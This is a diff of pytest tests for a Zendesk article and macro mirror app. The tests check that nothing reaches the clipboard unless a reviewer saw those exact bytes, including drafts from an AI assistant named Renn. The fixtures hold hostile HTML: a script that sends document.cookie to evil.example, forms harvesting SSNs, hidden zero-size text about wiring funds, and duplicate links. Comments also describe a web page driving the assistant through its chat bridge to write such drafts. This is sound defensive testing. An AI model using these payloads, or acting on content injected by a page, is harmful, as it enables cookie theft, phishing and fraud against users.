+    assert diff["change_count"] > 0          # identical TEXT, swapped href
+    removed = "\n".join(r["text"] for r in diff["rows"] if r["tag"] == "del")
+    added = "\n".join(r["text"] for r in diff["rows"] if r["tag"] == "add")
+    assert "https://help.alma.test/reset" in removed
+    assert "https://evil.example/reset" in added
+
+
+def test_copy_refused_after_the_draft_changes_under_the_review(empty_db):
+    """L2/L3: a recorded review is bound to the CONTENT it showed, by hash.
+    A page-driven re-edit, a rename, and an out-of-band store write (Renn's
+    MCP tools) all invalidate it; a fresh diff restores the copy.
+
+    Every released draft copy also crosses the universal native confirm
+    (approved here) — including the last one, whose bytes Renn wrote: the
+    gate no longer asks who authored anything."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen, confirms = _gated(empty_db, answer=True,
+                                  clipboard_fn=_clipboard(calls))
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="first", article_id=101,
+        body_html="<p>first</p>", rationale="r")
+    _serve_revisions(ctrl)
+    ctrl.js_request_diff("article", str(did))
+
+    # L3(a): a page-driven body edit of the reviewed (pending) draft
+    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": "second"}))
+    zendesk_store.set_draft_status(conn, "article", did, "ready")
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls == [] and "changed since" not in " ".join(seen["status"])
+    assert "not been reviewed" in seen["status"][-1]
+
+    # re-review → the copy is released, and it is the NEW bytes
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls[-1][0] == zendesk_store.get_article_draft(
+        conn, did)["body_html"]
+
+    # L3(b): a rename through the (rename-only) save slot
+    ctrl.js_save_draft("article", str(did), json.dumps({"title": "T2"}))
+    ctrl.js_copy_field("article_draft", str(did), "title")
+    assert len(calls) == 1
+    ctrl.js_request_diff("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "title")
+    assert calls[-1] == ("T2", None)
+
+    # the two releases so far each took a native confirm
+    assert len(confirms) == 2
+
+    # L2 hash check: an out-of-band write (Renn's mirror tools write the
+    # same rows from the MCP subprocess) invalidates the review even though
+    # this controller never saw the mutation.
+    zendesk_store.update_article_draft(
+        conn, did, body_html='<p>hi <a href="https://evil.example">x</a></p>')
+    n = len(calls)
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert len(calls) == n
+    assert "changed since you reviewed it" in seen["status"][-1]
+    ctrl.js_request_diff("article", str(did))
+    assert "https://evil.example" in _diff_text(seen["diffs"][-1])
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls[-1][0] == '<p>hi <a href="https://evil.example">x</a></p>'
+    # ...and those are RENN's bytes, which changes nothing: E2 proved the
+    # page can drive Renn, so a draft copy is a draft copy.
+    assert len(confirms) == 3
+    assert 'href="https://evil.example"' in _confirm_blob(confirms)
+
+
+def test_macro_draft_copy_requires_a_current_review(empty_db):
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
+    did = zendesk_store.save_macro_draft(
+        conn, name="M", macro_id=201, rationale="r",
+        actions=[{"field": "comment_value", "value": "Hello"}])
+    zendesk_store.set_draft_status(conn, "macro", did, "ready")
+    _serve_revisions(ctrl)
+    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
+    assert calls == [] and "not been reviewed" in seen["status"][-1]
+    ctrl.js_request_diff("macro", str(did))
+    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
+    assert calls == [("Hello", None)]
+    # content change under the review → refused again
+    zendesk_store.update_macro_draft(
+        conn, did, actions=[{"field": "comment_value",
+                             "value": "Call https://evil.example now"}])
+    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
+    assert len(calls) == 1
+    assert "changed since you reviewed it" in seen["status"][-1]
+
+
+def test_mirror_copy_now_requires_a_review_too(empty_db):
+    """VARIANT 3 (mirror copy had NO gate at all). Browsing the list served
+    ids and nothing else — no view of the bytes — yet every mirror field
+    copied. Now the gate covers mirror rows exactly like drafts: refused
+    until the detail (which carries body_source / the verbatim action
+    values) has been served, then released."""
+    _seed_mirror(empty_db.conn)
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl.js_refresh()                      # ids served, bytes NEVER shown
+    ctrl.js_copy_field("article", "101", "body_html")
+    ctrl.js_copy_field("article", "101", "title")
+    ctrl.js_copy_field("article", "101", "body_rich")
+    ctrl.js_copy_field("macro", "201", "macro_reply")
+    assert calls == [] and seen["copies"] == []
+    assert "has not been reviewed" in seen["status"][-1]
+
+    _review_article(ctrl, 101)
+    _review_macro(ctrl, 201)
+    ctrl.js_copy_field("article", "101", "body_html")
+    ctrl.js_copy_field("article", "101", "title")
+    ctrl.js_copy_field("article", "101", "body_rich")
+    ctrl.js_copy_field("macro", "201", "macro_reply")
+    assert len(calls) == 4
+    assert all(c["ok"] for c in seen["copies"])
+
+
+def test_mirror_review_invalidated_when_the_row_changes(empty_db):
+    """A pull/import under a served detail must not keep blessing copies:
+    the recompute-from-row content hash refuses, and the pull/import
+    notifications drop the ledger outright."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl.js_refresh()
+    _review_article(ctrl, 101)
+    zendesk_store.upsert_articles(conn, [
+        {"id": 101, "title": "Setting up SSO",
+         "body_html": '<p>Go to <a href="https://evil.example">here</a>.</p>',
+         "section_id": 9, "updated_at": "2026-07-02T10:00:00Z"}])
+    ctrl.js_copy_field("article", "101", "body_html")
+    assert calls == []
+    assert "changed since you reviewed it" in seen["status"][-1]
+    # re-open (re-read the new source) → released, and it IS the new bytes
+    _review_article(ctrl, 101)
+    ctrl.js_copy_field("article", "101", "body_html")
+    assert calls[-1][0] == zendesk_store.get_article(conn, 101)["body_html"]
+    # a pull/import resolution clears the ledger outright
+    ctrl.notify_pull_done({"ok": True})
+    assert ctrl._reviewed == {}
+    _review_article(ctrl, 101)
+    ctrl.notify_import_done({"ok": True})
+    assert ctrl._reviewed == {}
+
+
+def test_purge_and_delete_clear_recorded_reviews(empty_db):
+    """L3: draft ids are SQLite rowids and get REUSED after a delete — a
+    recorded review must never survive to bless a different draft."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="clean", article_id=101,
+        body_html="<p>clean</p>", rationale="r")
+    ctrl, seen, _confirms = _gated(empty_db, answer=True)
+    _serve_revisions(ctrl)
+    ctrl.js_request_diff("article", str(did))
+    assert ctrl._reviewed
+    ctrl.js_delete_revision("article", str(did))
+    assert ctrl._reviewed == {}
+
+    did2 = zendesk_store.save_article_draft(
+        conn, title="T", body="clean", article_id=101,
+        body_html="<p>clean</p>", rationale="r")
+    _serve_revisions(ctrl)
+    ctrl.js_request_diff("article", str(did2))
+    assert ctrl._reviewed
+    ctrl.js_purge_mirror("all")
+    assert ctrl._reviewed == {}
+
+
+# ── THE CLIPBOARD INVARIANT: the six confirmed exploit variants ──────
+#
+# Whatever reaches the clipboard is byte-identical to something the
+# reviewer was shown, and nothing can be present in the copied bytes
+# without being present in the reviewed material.
+#
+# Two earlier fix rounds patched the readable TEXT PROJECTION and lost,
+# because a projection drops things by construction. Each test below runs
+# one confirmed variant end to end and asserts the structural properties
+# that make it impossible now:
+#   (P1) the authoritative diff SHOWS the hostile bytes verbatim;
+#   (P2) change_count is non-zero whenever the bytes differ;
+#   (P3) the clipboard releases only bytes a review recorded.
+
+
+def _ready_draft(conn, ctrl, **kw):
+    """Stage a Renn-shaped article draft, serve it, mark it ready."""
+    did = zendesk_store.save_article_draft(
+        conn, article_id=101, rationale="r", **kw)
+    zendesk_store.set_draft_status(conn, "article", did, "ready")
+    _serve_revisions(ctrl)
+    return did
+
+
+def _source_added(diff):
+    return "\n".join(r["text"] for r in diff["rows"] if r["tag"] == "add")
+
+
+def test_variant1_allowlisted_non_url_attributes_are_visible(empty_db):
+    """VARIANT 1 — allowlisted NON-URL attributes hid content. sanitize_html
+    keeps style on span/div/p/td/th/mark/li and the global title attribute,
+    so `<span style="font-size: 0">…deleted safety warning…</span>`,
+    color:white and title="…" all survived into the copied bytes while the
+    text projection reported change_count 0 and an 'equal' row.
+
+    The authoritative diff is now the SOURCE, so every one of them is a
+    visible change, and the copy is bound to those exact bytes."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    base = zendesk_store.get_article(conn, 101)["body_html"]
+    # Each payload has a text projection IDENTICAL to the baseline's — the
+    # exact "change_count 0 + equal row while different bytes ship" symptom.
+    hidden = [
+        '<h2>Steps</h2><p><span style="font-size: 0">'
+        'Log into the admin console.</span></p>',
+        '<h2>Steps</h2><p><span style="color: white">'
+        'Log into the admin console.</span></p>',
+        '<h2>Steps</h2><p title="Wire the funds to acct 4402 first.">'
+        'Log into the admin console.</p>',
+    ]
+    for payload in hidden:
+        # the projection genuinely cannot see it (regression anchor)
+        assert (zendesk_store.html_to_review_text(payload)
+                == zendesk_store.html_to_review_text(base)), payload
+        calls = []
+        ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                       clipboard_fn=_clipboard(calls))
+        did = _ready_draft(conn, ctrl, title="Setting up SSO", body="x",
+                           body_html=payload)
+        ctrl.js_request_diff("article", str(did))
+        diff = seen["diffs"][-1]
+        # P2: bytes differ ⇒ the authoritative diff must say so
+        assert diff["bytes_equal"] is False
+        assert diff["change_count"] > 0, payload
+        assert diff["warning"] is None
+        # P1: the smuggled markup is literally on screen
+        assert payload in _source_added(diff)
+        # the secondary projection still reports nothing — proof that it
+        # is served as a convenience view and NOT as the authority
+        assert diff["text_change_count"] == 0
+        # P3: the copy is bound to those exact bytes
+        ctrl.js_copy_field("article_draft", str(did), "body_html")
+        assert calls[-1] == (payload, None)
+
+
+def test_variant1_zero_size_span_is_no_longer_an_equal_row(empty_db):
+    """The precise old symptom, at the diff level: change_count 0 with an
+    'equal' row while different bytes hit the clipboard. Pin BOTH halves —
+    the projection really is blind to it, the source diff really is not."""
+    from src.data.text_diff import change_count, diff_words
+    base = "<p><b>Warning: verify the payee.</b></p>"
+    evil = ('<p><span style="font-size: 0"><b>Warning: verify the payee.'
+            "</b></span></p>")
+    # the OLD authority (regression anchor): blind
+    assert change_count(diff_words(
+        zendesk_store.html_to_review_text(base),
+        zendesk_store.html_to_review_text(evil))) == 0
+    # the NEW authority: not blind
+    assert change_count(diff_words(base, evil)) > 0
+
+
+def test_variant2_renn_propose_stores_sanitized_html(empty_db):
+    """VARIANT 2 — Renn's propose path stored UNSANITIZED body_html
+    (markdown_to_html forwards raw HTML blocks), so <script src>,
+    <form action>, <object data>, <meta refresh>, <style>url()</style>,
+    onclick/onerror all reached the clipboard with NO diff row.
+
+    Sanitize now runs AT THE WRITE, so the bytes never exist; whatever
+    survives is in the source diff and on the clipboard identically."""
+    from src.data.chat_tools import zendesk_mirror_tools as tools
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    body_md = (
+        "Follow the steps.\n\n"
+        '<script src="https://evil.example/x.js"></script>\n\n'
+        '<form action="https://evil.example/collect"><input name="ssn">'
+        "</form>\n\n"
+        '<object data="https://evil.example/o"></object>\n\n'
+        '<meta http-equiv="refresh" content="0;url=https://evil.example">\n\n'
+        "<style>body{background:url(https://evil.example/b)}</style>\n\n"
+        '<p onclick="fetch(\'https://evil.example\')">Click</p>\n\n'
+        '<img src="x" onerror="alert(1)">\n')
+    res = tools._propose_article_update_impl(
+        conn, title="Setting up SSO", body_markdown=body_md,
+        rationale="update", article_id=101)
+    assert res["ok"] is True and res["status"] == "pending"
+    stored = zendesk_store.get_article_draft(conn, res["draft_id"])["body_html"]
+    low = stored.lower()
+    for banned in ("<script", "<form", "<object", "<meta", "<style",
+                   "onclick", "onerror", "evil.example/x.js",
+                   "evil.example/collect", "evil.example/b"):
+        assert banned not in low, banned
+    assert stored == sanitize_html(stored)          # fixed point
+    calls = []
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
+    zendesk_store.set_draft_status(conn, "article", res["draft_id"], "ready")
+    _serve_revisions(ctrl)
+    ctrl.js_request_diff("article", str(res["draft_id"]))
+    diff = seen["diffs"][-1]
+    assert diff["change_count"] > 0 and diff["warning"] is None
+    assert diff["markup_notice"] == ""              # nothing hidden left
+    ctrl.js_copy_field("article_draft", str(res["draft_id"]), "body_html")
+    assert calls[-1] == (stored, None)
+    assert _source_added(diff).strip() == stored.strip()
+
+
+def test_variant3_mirror_article_source_is_shown_before_any_copy(empty_db):
+    """VARIANT 3 — mirror-article copy had no review gate AND a dishonest
+    rendering: _article_srcdoc was sanitized while _resolve_copy returned
+    the row's body_html byte-verbatim, and zendesk_import stored raw file
+    bytes. Script/form tags were invisible in the only on-screen view and
+    still landed on the clipboard.
+
+    Now: import sanitizes at the write; a pull-origin row that still
+    carries such bytes is shown verbatim as body_source with an explicit
+    notice; and no mirror copy runs before that payload was served."""
+    conn = empty_db.conn
+    raw = ('<h2>Guide</h2><form action="https://evil.example/collect">'
+           '<input name="ssn"></form><script>fetch("//evil")</script>')
+    zendesk_store.upsert_articles(conn, [
+        {"id": 501, "title": "Imported", "body_html": raw,
+         "updated_at": "2026-07-01T00:00:00Z"}], origin="import",
+        source_file="C:/tmp/evil.html")
+    zendesk_store.upsert_articles(conn, [
+        {"id": 502, "title": "Pulled", "body_html": raw,
+         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    ctrl.js_refresh()
+    # no detail served yet → both copies refused (this is the missing gate)
+    ctrl.js_copy_field("article", "501", "body_html")
+    ctrl.js_copy_field("article", "502", "body_html")
+    assert calls == []
+
+    imported = zendesk_store.get_article(conn, 501)["body_html"]
+    assert "<form" not in imported.lower() and "<script" not in imported.lower()
+    _review_article(ctrl, 501)
+    assert seen["article"][-1]["body_source"] == imported
+    assert seen["article"][-1]["markup_notice"] == ""
+
+    _review_article(ctrl, 502)
+    detail = seen["article"][-1]
+    assert detail["body_source"] == raw              # verbatim, and SHOWN
+    assert "<form" not in detail["body_srcdoc"].lower()
+    assert detail["markup_notice"]                   # honest about it
+    ctrl.js_copy_field("article", "502", "body_html")
+    assert calls[-1] == (raw, None)
+    assert "preview does not display" in seen["status"][-1]
+
+
+def test_variant4_duplicate_attributes_are_a_visible_change(empty_db):
+    """VARIANT 4 — the projection kept only the FIRST occurrence of a
+    duplicated attribute while sanitize emitted both, so a second href/src
+    was reviewer-invisible. The source diff shows the raw markup, so the
+    duplicate is right there; and whichever bytes the clipboard releases,
+    they are hash-bound to that diff."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    evil = ('<p>Go to <a href="https://help.alma.test/ok" '
+            'href="https://evil.example/steal">the portal</a>.</p>'
+            '<img src="https://cdn.example/logo.png" '
+            'src="https://evil.example/beacon.gif">')
+    calls = []
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
+    did = _ready_draft(conn, ctrl, title="Setting up SSO", body="x",
+                       body_html=evil)
+    ctrl.js_request_diff("article", str(did))
+    diff = seen["diffs"][-1]
+    added = _source_added(diff)
+    assert "https://evil.example/steal" in added
+    assert "https://evil.example/beacon.gif" in added
+    assert diff["change_count"] > 0
+    # the projection really does drop the second occurrence (why it lost)
+    projected = zendesk_store.html_to_review_text(evil)
+    assert "https://evil.example/steal" not in projected
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls[-1] == (evil, None)
+
+
+def test_variant5_a_computed_diff_is_not_a_read_diff(empty_db):
+    """VARIANT 5 — the gate proved a diff was COMPUTED, not READ:
+    js_request_diff is page-callable and recorded the review as a side
+    effect, and js_mark_copied went pending → copied directly.
+
+    That asymmetry is unchanged BY DESIGN (a page script cannot be forced to
+    be a human), so what must hold is the property that keeps it harmless:
+    the recorded review is bound to the EXACT BYTES, so the only thing a
+    page script can self-authorize is bytes ALREADY IN THE ROW at the moment
+    it asked for the diff. Pin that here.
+
+    CORRECTION: the original reasoning went one step further and claimed
+    "it can never widen the release". That is wrong whenever the page can
+    influence what lands in the row — directly (js_save_draft's rename
+    allowlist, js_save_body_edit) or indirectly (E2: driving Renn through
+    the co-registered chat bridge). Round 4 tried to tell those apart by
+    authorship and failed; the answer is the UNIVERSAL draft-copy confirm
+    (see the draft-copy section below). This test's own coverage —
+    self-authorized transitions and hash-bound release — is unchanged and
+    still load-bearing."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    did = _ready_draft(conn, ctrl, title="T", body="x",
+                       body_html="<p>reviewed</p>")
+    ctrl.js_request_diff("article", str(did))
+    served = _source_added(seen["diffs"][-1])
+    assert "<p>reviewed</p>" in served
+
+    # a hostile rewrite lands out of band, then the page replays the
+    # transitions and the copy without re-requesting a diff
+    zendesk_store.update_article_draft(
+        conn, did, body_html='<p>reviewed</p><script>x()</script>')
+    ctrl.js_mark_copied("article", str(did))
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls == []
+    assert "changed since you reviewed it" in seen["status"][-1]
+    # and pending → copied still cannot skip the byte gate either
+    did2 = zendesk_store.save_article_draft(
+        conn, title="T2", body="x", article_id=101, rationale="r",
+        body_html="<p>never reviewed</p>")
+    _serve_revisions(ctrl)
+    ctrl.js_mark_copied("article", str(did2))
+    assert zendesk_store.get_article_draft(conn, did2)["status"] == "copied"
+    ctrl.js_copy_field("article_draft", str(did2), "body_html")
+    assert calls == []
+    assert "has not been reviewed" in seen["status"][-1]
+
+
+def test_variant6_script_and_style_content_is_in_the_reviewed_bytes(empty_db):
+    """VARIANT 6 — <script>/<style> CONTENT is deliberately erased by the
+    text projection (html_to_text/html_to_review_text skip those subtrees)
+    yet was present in the copied bytes.
+
+    A draft can still hold such bytes (the store deliberately does not
+    rewrite draft rows — a version restore must reproduce mirror bytes
+    exactly), so the invariant has to come from the review surface: the
+    source diff carries the script body character for character, the
+    markup notice fires, and the clipboard is hash-bound to it."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    evil = ('<p>Steps</p><script>fetch("https://evil.example/"+document.'
+            'cookie)</script><style>p{background:url(https://evil.example/b)}'
+            '</style>')
+    calls = []
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
+    did = _ready_draft(conn, ctrl, title="Setting up SSO", body="x",
+                       body_html=evil)
+    ctrl.js_request_diff("article", str(did))
+    diff = seen["diffs"][-1]
+    added = _source_added(diff)
+    assert "fetch(" in added and "document.cookie" in added
+    assert "url(https://evil.example/b)" in added
+    assert diff["change_count"] > 0
+    assert "preview does not display" in diff["markup_notice"]
+    # the projection erases both bodies — that is exactly why it cannot be
+    # the authority (regression anchor)
+    projected = zendesk_store.html_to_review_text(evil)
+    assert "document.cookie" not in projected
+    assert "evil.example/b" not in projected
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls[-1] == (evil, None)
+    assert "preview does not display" in seen["status"][-1]
+    # the rich mime flavour is still defanged, and is itself covered by the
+    # review record (both flavours are hashed)
+    ctrl.js_copy_field("article_draft", str(did), "body_rich")
+    text, html = calls[-1]
+    assert text == evil
+    assert "fetch(" not in html and "evil.example/b" not in html
+    assert seen["copies"][-1]["sanitized"] is True
+
+
+def test_no_copy_can_release_bytes_the_review_never_showed(empty_db):
+    """The invariant stated directly: for every copy target and field, the
+    exact string handed to the clipboard hashes to something the recorded
+    review contained. Assert it by construction — corrupt one recorded
+    hash and the copy must fail closed."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    calls = []
+    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
+    did = _ready_draft(conn, ctrl, title="T", body="x",
+                       body_html="<p>body</p>")
+    ctrl.js_request_diff("article", str(did))
+    rec = ctrl._reviewed[("article_draft", did)]
+    # every releasable payload was recorded, both flavours
+    payloads, content_hash, _row = ctrl._copy_bundle(conn, "article_draft", did)
+    assert content_hash == rec["content"]
+    for p in payloads.values():
+        assert zendesk_web._sha(p["text"]) in rec["bytes"]
+        if p["html"] is not None:
+            assert zendesk_web._sha(p["html"]) in rec["bytes"]
+    # tamper: a review that no longer covers the bytes releases nothing
+    ctrl._reviewed[("article_draft", did)] = {
+        "content": content_hash, "bytes": frozenset({zendesk_web._sha("x")})}
+    ctrl.js_copy_field("article_draft", str(did), "body_html")
+    assert calls == []
+    assert "never showed" in seen["status"][-1]
+    assert ("article_draft", did) not in ctrl._reviewed   # fails closed
+
+
+def test_every_recorded_hash_is_shown_or_derived_from_shown_bytes(empty_db):
+    """Closes the last gap in the invariant's wording.
+
+    Of everything ``_record_review`` binds, the plain text flavours are
+    rendered literally on the review surface (the diff rows / body_source /
+    the title row). The rich (text/html mime) flavour is not independent
+    content: it is ``sanitize_html`` of the string the reviewer WAS shown,
+    and sanitize only removes and escapes — it can never introduce a tag,
+    attribute or URL that was absent from the source. Assert that derivation
+    (and the accompanying notice) so the claim is mechanically checked, not
+    assumed.
+
+    Note the RENDERED preview srcdoc is a third, WIDER rendering
+    (sanitize_html_preview + Help Center CSS) and is deliberately NOT a
+    clipboard flavour — pinned here so a future widening of the preview can
+    never be mistaken for widening the clipboard."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    ctrl, seen = _controller(empty_db)
+    _review_article(ctrl, 101)
+    payloads, _h, _r = ctrl._copy_bundle(conn, "article", 101)
+    detail = seen["article"][-1]
+    assert payloads["body_html"]["text"] == detail["body_source"]
+    # the rich flavour derives from the exact bytes the reviewer was shown
+    assert payloads["body_rich"]["html"] == sanitize_html(detail["body_source"])
+    # ...and it is NOT the preview srcdoc (which carries the Help Center CSS
+    # and the wider preview profile)
+    assert payloads["body_rich"]["html"] != detail["body_srcdoc"]
+    assert "alma-hc-article" in detail["body_srcdoc"]
+
+    for html in ("<h2>Clean</h2><p>Fine.</p>", HOSTILE_HTML,
+                 '<p><span style="font-size: 0">hidden</span></p>'):
+        did = _ready_draft(conn, ctrl, title="T", body="x", body_html=html)
+        ctrl.js_request_diff("article", str(did))
+        diff = seen["diffs"][-1]
+        payloads, _h, _r = ctrl._copy_bundle(conn, "article_draft", did)
+        shown = payloads["body_html"]["text"]
+        rich = payloads["body_rich"]["html"]
+        # the plain flavour is literally in the served source diff
+        assert shown in _source_added(diff)
+        # the rich flavour is sanitize_html OF that exact string, and
+        # sanitizing again changes nothing (removal-only, idempotent)
+        assert rich == sanitize_html(shown)
+        assert sanitize_html(rich) == rich
+        # and whenever they differ the reviewer is told, in the diff and
+        # again on the status line at copy time
+        if rich != shown:
+            assert "preview does not display" in diff["markup_notice"]
+        else:
+            assert diff["markup_notice"] == ""
+
+
+def test_zero_change_with_differing_bytes_is_surfaced_as_a_warning(empty_db):
+    """Requirement D. A source diff that reports no changed line while the
+    bytes differ is a DIFF BUG, never an innocent '0 changed lines'. It
+    cannot happen for any of the six variants (asserted above); the one
+    residual case is a trailing-newline-only delta, which splitlines cannot
+    represent — so pin that it surfaces the warning instead."""
+    conn = empty_db.conn
+    zendesk_store.upsert_articles(conn, [
+        {"id": 601, "title": "T", "body_html": "<p>a</p>\n",
+         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
+    ctrl, seen = _controller(empty_db)
+    did = zendesk_store.save_article_draft(
+        conn, title="T", body="x", article_id=601, rationale="r",
+        body_html="<p>a</p>")
+    _serve_revisions(ctrl)
+    ctrl.js_request_diff("article", str(did))
+    diff = seen["diffs"][-1]
+    assert diff["change_count"] == 0
+    assert diff["bytes_equal"] is False
+    assert diff["warning"] == zendesk_web._ZERO_CHANGE_WARNING
+    # and the honest zero: identical bytes report zero WITHOUT a warning
+    zendesk_store.update_article_draft(conn, did, body_html="<p>a</p>\n")
+    ctrl.js_request_diff("article", str(did))
+    diff = seen["diffs"][-1]
+    assert diff["change_count"] == 0 and diff["bytes_equal"] is True
+    assert diff["warning"] is None
+
+
+def test_macro_source_diff_shows_exact_action_bytes(empty_db):
+    """Macros get the same treatment: the authoritative surface is the
+    canonical actions JSON, so markup inside a reply is visible and the
+    copied reply is hash-bound to it."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    reply = ('<p>Hi</p><span style="font-size: 0">Wire the funds.</span>'
+             '<script>x()</script>')
+    calls = []
+    ctrl, seen, _confirms = _gated(empty_db, answer=True,
+                                   clipboard_fn=_clipboard(calls))
+    did = zendesk_store.save_macro_draft(
+        conn, name="Refund apology", macro_id=201, rationale="r",
+        actions=[{"field": "comment_value", "value": reply}])
+    zendesk_store.set_draft_status(conn, "macro", did, "ready")
+    _serve_revisions(ctrl)
+    ctrl.js_request_diff("macro", str(did))
+    diff = seen["diffs"][-1]
+    added = _source_added(diff)
+    assert "font-size: 0" in added and "Wire the funds." in added
+    assert "<script>x()<\\/script>" in added or "<script>x()</script>" in added
+    assert diff["change_count"] > 0 and diff["warning"] is None
+    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
+    assert calls[-1] == (reply, None)
+
+
+# ── SEC-3: the controller's payloads vs what the SPA actually reads ──
+
+WEB_SRC = REPO / "web" / "src" / "zendesk"
+
+
+def _jsx_reads(files, var):
+    """Top-level keys the JSX genuinely reads off `var` (`article.body_text`
+    → 'body_text'). Not a parser — a deliberately dumb, greedy scan, so it
+    over-reports rather than missing a read."""
+    pattern = re.compile(r"(?<![\w.$])" + var + r"\.([A-Za-z_]\w*)")
+    keys: set[str] = set()
+    for name in files:
+        keys |= set(pattern.findall(
+            (WEB_SRC / name).read_text(encoding="utf-8")))
+    return keys
+
+
+def test_controller_payloads_cover_every_key_the_spa_reads(empty_db):
+    """SEC-3 blind spot, closed. The JS contract test (zendesk.test.jsx)
+    checks the DEMO FIXTURE's keys, so when the controller quietly stopped
+    emitting article_detail.body_text and revision.body — both READ by
+    ArticleEditor/RevisionCenter to seed the specialist edit textarea — CI
+    stayed green while both body editors opened BLANK in the real app (and
+    a save then replaced the whole body with only what was typed).
+
+    Bind the CONTROLLER's emitted payloads to the JSX SOURCES instead, so a
+    controller/page drift cannot hide behind a fixture again."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    did = zendesk_store.save_article_draft(
+        conn, title="SSO (rev)", body="## Draft body\nStep one.",
+        article_id=101, rationale="r")
+    zendesk_store.save_macro_draft(
+        conn, name="Refund v2", macro_id=201, rationale="r",
+        actions=[{"field": "comment_value", "value": "hi"}])
+    ctrl, seen = _controller(empty_db)
+    ctrl.js_open_article("101")
+    ctrl.js_open_macro("201")
+    ctrl.js_request_revisions("all")
+    ctrl.js_request_diff("article", str(did))
+
+    surfaces = [
+        ("article", ("ArticleEditor.jsx", "ZendeskApp.jsx"),
+         [seen["article"][-1]]),
+        ("macro", ("MacroEditor.jsx", "ZendeskApp.jsx"), [seen["macro"][-1]]),
+        ("rev", ("RevisionCenter.jsx",), seen["revisions"][-1]["revisions"]),
+        ("diff", ("RevisionDiff.jsx",), [seen["diffs"][-1]]),
+    ]
+    for var, files, payloads in surfaces:
+        wanted = _jsx_reads(files, var)
+        assert wanted, f"no {var}.* reads found — the scan broke, not the app"
+        assert payloads, f"{var}: nothing emitted to compare against"
+        for payload in payloads:
+            missing = sorted(wanted - set(payload))
+            assert not missing, (
+                f"{var}: the SPA reads {missing} but the controller never "
+                "emits them")
+
+    # the two that actually shipped broken, named so the regression is
+    # readable without re-deriving it from the scan
+    detail = seen["article"][-1]
+    assert "Log into the admin console." in detail["body_text"]
+    assert "<h2" not in detail["body_text"]        # markdown seed, not HTML
+    row = next(r for r in seen["revisions"][-1]["revisions"]
+               if r["draft_id"] == did and r["kind"] == "article")
+    assert row["body"] == "## Draft body\nStep one."
+
+
+def test_revision_bodies_are_served_exactly_where_edits_are_accepted(empty_db):
+    """The `body` seed rides the revisions feed, which carries up to 500
+    rows of up-to-200k-char bodies — so it is served for exactly the drafts
+    js_save_body_edit accepts (pending articles) and is empty elsewhere.
+    Keyed off the same constant the save slot validates against."""
+    _seed_mirror(empty_db.conn)
+    conn = empty_db.conn
+    pending = zendesk_store.save_article_draft(
+        conn, title="P", body="pending body", article_id=101, rationale="r")
+    ready = zendesk_store.save_article_draft(
+        conn, title="R", body="ready body", article_id=101, rationale="r")
+    zendesk_store.set_draft_status(conn, "article", ready, "ready")
+    mac = zendesk_store.save_macro_draft(
+        conn, name="M", macro_id=201, rationale="r",
+        actions=[{"field": "comment_value", "value": "reply"}])
+    ctrl, seen = _controller(empty_db)
+    ctrl.js_request_revisions("all")
+    rows = {(r["kind"], r["draft_id"]): r
+            for r in seen["revisions"][-1]["revisions"]}
+    assert rows[("article", pending)]["body"] == "pending body"
+    assert rows[("article", ready)]["body"] == ""      # not editable
+    assert rows[("macro", mac)]["body"] == ""          # macros out of scope
+    assert zendesk_web._EDITABLE_DRAFT_STATUS == "pending"
+    # and a body edit is accepted for exactly the row that carries a seed
+    ctrl.js_save_body_edit("draft", str(pending), json.dumps({"body": "x"}))
+    assert zendesk_store.get_article_draft(conn, pending)["body"] == "x"
+    ctrl.js_save_body_edit("draft", str(ready), json.dumps({"body": "x"}))
+    assert zendesk_store.get_article_draft(conn, ready)["body"] == "ready body"
+
+
+# ── SEC-4: a hostile macro reply is announced like a hostile article ─
+
+def test_macro_reply_markup_is_announced_not_hidden(empty_db):
+    """SEC-4: a pull-origin macro is byte-faithful to remote Zendesk, so a
+    comment_value_html full of script/handler markup is copyable verbatim.
